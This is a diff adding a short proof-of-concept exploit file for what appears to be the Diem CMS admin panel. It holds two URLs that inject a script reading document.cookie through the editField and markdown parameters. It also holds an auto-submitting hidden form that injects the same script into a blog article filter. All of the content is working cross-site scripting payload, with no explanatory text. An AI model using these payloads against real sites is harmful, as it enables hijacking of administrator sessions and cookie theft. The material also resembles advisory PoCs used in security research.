@@ -1,0 +1,14 @@
+http://www.example.com/admin.php/seo/pages/manage-pages/editField?dm_cpi=0&amp;dm_xhr=1&amp;value=title&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;%2Fscript&gt;&amp;id=&amp;page_id=1&amp;field=title
+http://www.example.com/admin.php/+/dmCore/markdown?dm_cpi=0&amp;dm_xhr=1&amp;text=title&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;%2Fscript&gt;
+
+&lt;form action=&quot;http://www.example.com/admin.php/content/blog/articles/filter&quot; name=&quot;main&quot; &gt;
+&lt;input type=&quot;hidden&quot; name=&quot;article_form_filter[name][text]&quot; value=&#039;1&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;article_form_filter[is_active]&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;article_form_filter[text][text]&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;article_form_filter[created_by]&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;article_form_filter[created_at]&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;article_form_filter[updated_at]&quot; value=&quot;&quot; /&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
